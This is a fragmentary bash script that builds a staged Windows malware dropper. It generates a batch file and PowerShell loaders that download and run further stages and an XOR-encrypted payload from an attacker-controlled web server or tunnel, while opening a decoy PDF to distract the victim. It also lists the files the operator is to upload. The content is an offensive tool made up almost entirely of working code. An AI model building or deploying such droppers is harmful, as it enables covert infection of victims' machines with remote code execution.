...
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH="/generated"  # Default base path for all files
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
...
show_usage() {
    ...
    echo "  -u, --url WEB_URL         Your web server URL (e.g., https://site.netlify.app)"
    echo
    echo "Options:"
...
# ============================================
# STEP 3: Create PowerShell stages (FIXED URLS)
# ============================================
echo -e "${YELLOW}[3/6] Creating PowerShell stages with CORRECT URLs...${NC}"

# Stage 3 - Final payload loader
cat > payloads/stage3.ps1 << EOF
# Stage 3 - Final payload loader
# Tunnel: $TUNNEL_HOST
# Full URL: $FULL_BASE_URL

\$key = $XOR_KEY_DEC
\$baseUrl = "$FULL_BASE_URL"

try {
    Write-Host "[Stage3] Downloading payload.enc from \$baseUrl/payload.enc..." -ForegroundColor Yellow
...
Write-Host "[Stage2] Downloading stage3.ps1 from $FULL_BASE_URL/payloads/stage3.ps1..." -ForegroundColor Yellow
\$url = "$FULL_BASE_URL/payloads/stage3.ps1"
...
# ============================================
# STEP 4: Create FIXED Stage1.bat (with correct URLs)
# ============================================
echo -e "${YELLOW}[4/6] Creating FIXED Stage1.bat with correct URLs...${NC}"
...
echo     URL: $FULL_BASE_URL/payloads/stage2.ps1
echo.
...
\$baseUrl = '$FULL_BASE_URL';
try {
    Write-Host '[PowerShell] Downloading from: \$baseUrl/payloads/stage2.ps1' -ForegroundColor Yellow;
    \$script = (New-Object Net.WebClient).DownloadString('\$baseUrl/payloads/stage2.ps1');
...
if exist decoy.pdf (
    ...
    echo [✗] decoy.pdf not found - downloading from $FULL_BASE_URL/decoy.pdf...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')"
    if exist decoy.pdf (
...
if exist decoy.pdf (start decoy.pdf) else (powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf)
EOF
fi
...
if [ -f output/payload.raw ]; then
    ...
    echo ""
    echo "Files to upload to your web server ($FULL_BASE_URL):"
    ...
    echo "  - payloads/stage2.ps1 -> $FULL_BASE_URL/payloads/stage2.ps1"
...
echo "3. Upload ALL files to your web server at: $FULL_BASE_URL"
echo "   - payload.enc"
echo "   - decoy.pdf"
